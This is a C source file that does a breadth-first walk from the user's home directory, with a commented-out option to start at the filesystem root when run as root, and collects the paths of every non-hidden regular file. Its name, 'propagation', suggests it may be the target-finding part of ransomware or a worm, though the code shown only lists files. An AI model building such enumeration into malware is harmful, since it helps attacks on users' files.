#include "propagation.h"
#include "../debug/debug.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/queue.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>

static int push(struct queue *q, const char *path) {
    struct entry *e = malloc(sizeof(*e));
    if (e == NULL) {
        LOG_PERROR("malloc");
        return 1;
    }

    e->path = strdup(path);
    if (e->path == NULL) {
        LOG_PERROR("strdup");
        free(e);
        return 1;
    }

    STAILQ_INSERT_TAIL(q, e, link);
    return 0;
}

static int get_start_dir(char *out, size_t out_size) {
    /*
    if (geteuid() == 0) {
        if (out_size >= 2) {
            strcpy(out, "/");
            return 0;
        }
    }
    */

    const char *home = getenv("HOME");
    if (home != NULL && access(home, R_OK | X_OK) == 0 && strlen(home) < out_size) {
        strcpy(out, home);
        return 0;
    }

    strcpy(out, "/home");
    return 0;
}

static int scan_directory(const char *dir_path, struct queue *dirs, struct queue *files)
{
    DIR *dp = opendir(dir_path);
    if (dp == NULL) {
        LOG_DEBUG("opendir(%s): %s\n", dir_path, strerror(errno));
        return 0;
    }

    struct dirent *ent;
    int ret = 0;

    while ((ent = readdir(dp)) != NULL) {
        /*
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;
        */

        if (ent->d_name[0] == '.') // ignore hidden files
            continue;

        char full_path[PATH_MAX];
        int n = snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, ent->d_name);
        if (n < 0 || (size_t)n >= sizeof(full_path)) {
            continue;
        }

        struct stat st;
        if (lstat(full_path, &st) != 0) {
            LOG_DEBUG("lstat(%s): %s\n", full_path, strerror(errno));
            continue;
        }

        if (S_ISLNK(st.st_mode)) {
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            if (push(dirs, full_path) != 0) {
                ret = 1;
                break;
            }
        }
        else if (S_ISREG(st.st_mode)) {
            if (push(files, full_path) != 0) {
                ret = 1;
                break;
            }
        }
    }

    closedir(dp);
    return ret;
}

static int bfs_explore(struct queue *dirs, struct queue *files)
{
    struct entry *cur;

    for (cur = STAILQ_FIRST(dirs); cur != NULL; cur = STAILQ_NEXT(cur, link)) {
        if (scan_directory(cur->path, dirs, files) != 0)
            return 1;
    }

    return 0;
}

int free_queue(struct queue *q)
{
    if (q == NULL)
        return 1;

    struct entry *e;
    while (!STAILQ_EMPTY(q)) {
        e = STAILQ_FIRST(q);
        STAILQ_REMOVE_HEAD(q, link);
        free(e->path);
        free(e);
    }

    return 0;
}

int propagation(struct queue *files)
{
    struct queue dirs;
    STAILQ_INIT(&dirs);

    char start_dir[PATH_MAX];
    LOG_DEBUG("get_start_dir: choose ROOT dir or HOME dir.");
    if (get_start_dir(start_dir, sizeof(start_dir)) != 0) {
        LOG_DEBUG("get_start_dir failed.");
        return 1;
    }

    if (push(&dirs, start_dir) != 0) {
        LOG_DEBUG("push failed.");
        return 1;
    }

    LOG_DEBUG("bfs_explore: find all files");
    if (bfs_explore(&dirs, files)) {
        LOG_DEBUG("bfs failed.");
        return 1;
    }

    free_queue(&dirs);
    return 0;
}
